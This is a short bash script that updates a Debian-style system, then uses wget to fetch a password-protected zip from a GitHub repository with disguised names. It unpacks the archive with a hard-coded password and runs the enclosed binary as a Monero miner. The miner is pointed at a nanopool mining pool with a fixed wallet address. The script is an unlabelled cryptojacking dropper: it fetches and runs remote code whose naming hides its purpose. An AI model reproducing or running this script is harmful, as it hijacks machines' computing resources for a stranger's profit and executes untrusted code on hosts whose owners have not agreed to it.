#!/bin/bash
apt-get update -y
apt-get dist-upgrade -y
apt-get clean
apt-get install zip -y
mkdir -p /otoke && cd /otoke
wget -q https://github.com/spiritedaway5/roosterant/raw/main/birdsoybeans.zip
unzip -P aceventura birdsoybeans.zip
chmod -R +x /otoke
./piealamode --disable-gpu --algorithm randomx --pool xmr-us-east1.nanopool.org:14444 --wallet 8A399eWG8bW5M6ZGzEdcb9g1XA7cXRJaWR9QVDbEMdGU5pcw9D2eMpHX1x7pwFtUpLekNTzxjYCQmYiKkAkiJFGxPqFdY94.c01